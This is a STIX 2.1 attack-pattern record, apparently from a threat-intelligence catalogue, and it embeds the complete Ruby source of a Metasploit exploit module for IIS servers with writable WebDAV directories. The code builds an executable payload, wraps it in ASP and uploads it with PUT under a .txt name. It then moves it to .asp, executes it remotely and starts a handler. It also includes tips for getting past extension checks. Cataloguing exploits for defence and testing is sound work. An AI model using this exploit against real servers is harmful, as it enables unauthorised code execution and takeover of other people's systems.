{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7afbc3e-38f7-49f0-9bbb-831816254a0b",
    "created": "2024-08-14T16:48:36.315207Z",
    "modified": "2024-08-14T16:48:36.315212Z",
    "name": "Microsoft IIS WebDAV Write Access Code Execution",
    "description": " This module can be used to execute a payload on IIS servers that have world-writeable directories. The payload is uploaded as an ASP script via a WebDAV PUT request.  The target IIS machine must meet these conditions to be considered as exploitable: It allows 'Script resource access', Read and Write permission, and supports ASP. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/iis_webdav_upload_asp.rb",
            "external_id": "iis_webdav_upload_asp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        => 'Microsoft IIS WebDAV Write Access Code Execution',\n      'Description' => %q{\n          This module can be used to execute a payload on IIS servers that\n        have world-writeable directories. The payload is uploaded as an ASP\n        script via a WebDAV PUT request.\n\n          The target IIS machine must meet these conditions to be considered\n        as exploitable: It allows 'Script resource access', Read and Write\n        permission, and supports ASP.\n      },\n      'Author'      => 'hdm',\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          ['OSVDB', '397'],\n          ['BID', '12141']\n        ],\n      'Targets'     =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Dec 31 2004'\n    )\n\n    register_options(\n      [\n      # The USERNAME and PASSWORD are registered again to make them more obvious they're\n      # configurable.\n      OptString.new('HttpUsername',\n        [false, 'The HTTP username to specify for authentication', '']),\n      OptString.new('HttpPassword',\n        [false, 'The HTTP password to specify for authentication', '']),\n      OptString.new('PATH',\n        [ true, 'The path to attempt to upload', '/metasploit%RAND%.asp']),\n      OptEnum.new('METHOD',\n        [ true, 'Move or copy the file on the remote system from .txt -> .asp', 'move', ['move','copy']])\n      ])\n  end\n\n  def exploit\n    # Generate the ASP containing the EXE containing the payload\n    exe  = generate_payload_exe\n    asp  = Msf::Util::EXE.to_exe_asp(exe)\n    path = datastore['PATH'].gsub('%RAND%', rand(0x10000000).to_s)\n    path = \"/\" + path if path[0] != \"/\"\n    # Incase of \"/path/to/filename.asp;.txt\"\n    path_tmp = \"/\" + File.basename(path.gsub(/\\;.*/,''), \".*\") + \".txt\"\n    path_tmp = File.dirname(path) + path_tmp if File.dirname(path) != \"/\"\n    action = datastore['METHOD'].downcase.gsub('e','') + \"ing\"\n    alt_method = \"move\"\n    alt_method = \"copy\" if datastore['METHOD'].upcase == \"MOVE\"\n\n    #\n    # CHECK\n    #\n    print_status(\"Checking #{path}\")\n    res = send_request_cgi({\n      'uri'          =>  path ,\n      'method'       => 'GET',\n    }, 20)\n\n    unless res\n      print_error(\"Connection timed out while trying to checking #{path}\")\n      return\n    end\n\n    if (res.code == 200)\n      print_error(\"File #{path} already exists on the target\")\n      return\n    end\n\n\n    #\n    # UPLOAD\n    #\n    print_status(\"Uploading #{asp.length} bytes to #{path_tmp}...\")\n\n    begin\n      res = send_request_cgi({\n        'uri'          =>  path_tmp,\n        'method'       => 'PUT',\n        'ctype'        => 'application/octet-stream',\n        'data'         =>  asp,\n      }, 20)\n    rescue Errno::ECONNRESET => e\n      print_error(\"#{e.message}. It's possible either you set the PATH option wrong, or IIS doesn't allow 'Write' permission.\")\n      return\n    end\n\n    unless res\n      print_error(\"Connection timed out while uploading to #{path_tmp}\")\n      return\n    end\n\n    if (res.code < 200 or res.code >= 300)\n      print_error(\"Upload failed on #{path_tmp} [#{res.code} #{res.message}]\")\n      return\n    end\n\n    #\n    # MOVE/COPY\n    #\n    if (path_tmp == path)\n      print_warning(\"Same filename for PATH and PATH_TEMP detected (#{path_tmp})\")\n      print_warning(\"Do not end PATH with '.txt'\")\n    else\n      print_status(\"#{action.capitalize} #{path_tmp} to #{path}...\")\n\n      res = send_request_cgi({\n          'uri'          => path_tmp,\n          'method'       => datastore['METHOD'].upcase,\n          'headers'      => {'Destination' => path}\n      }, 20)\n\n      unless res\n        print_error(\"Connection timed out while moving to #{path}\")\n        return\n      end\n\n      if (res.code < 200 or res.code >= 300)\n        print_error(\"#{datastore['METHOD'].capitalize} failed on #{path_tmp} [#{res.code} #{res.message}]\")\n        case res.code\n        when 403\n          print_error(\"IIS possibly does not allow 'READ' permission, which is required to upload executable content.\")\n        end\n        return\n      elsif (res.code == 207)\n        print_warning(\"#{datastore['METHOD'].capitalize} may have failed. [#{res.code} Response]\")\n        print_warning(\"Try using 'set METHOD #{alt_method}' instead\")\n      end\n    end\n\n\n    #\n    # EXECUTE\n    #\n    print_status(\"Executing #{path}...\")\n\n    res = send_request_cgi({\n      'uri'          =>  path,\n      'method'       => 'GET'\n    }, 20)\n\n    unless res\n      print_error(\"Execution failed on #{path} [No Response]\")\n      return\n    end\n\n    if (res.code < 200 or res.code >= 300)\n      print_error(\"Execution failed on #{path} [#{res.code} #{res.message}]\")\n      case res.message\n      when 'Not Found', 'Object Not Found'\n        print_error(\"The #{datastore['METHOD'].upcase} action failed. Possibly IIS doesn't allow 'Script Resource Access'\")\n        print_warning(\"Try using 'set METHOD #{alt_method}' instead\")\n        vprint_warning(\"Pro Tip: Try 'set PATH /metasploit%RAND%.asp;.txt' instead\") unless path.include? \";\"\n      end\n      return\n    end\n\n\n    #\n    # DELETE\n    #\n    print_status(\"Deleting #{path} (this doesn't always work)...\")\n\n    res = send_request_cgi({\n      'uri'          =>  path,\n      'method'       => 'DELETE'\n    }, 20)\n\n    unless res\n      print_error(\"Deletion failed on #{path} [No Response]\")\n      return\n    end\n\n    if (res.code < 200 or res.code >= 300)\n      # Changed this to a warning, because red is scary and if this part fails,\n      # honestly it's not that bad. In most cases this is probably expected anyway\n      # because by default we're using IWAM_*, which doesn't give us a lot of\n      # freedom to begin with.\n      print_warning(\"Deletion failed on #{path} [#{res.code} #{res.message}]\")\n      return\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "Dec 31 2004",
    "x_mitre_platforms": [
        "win'"
    ]
}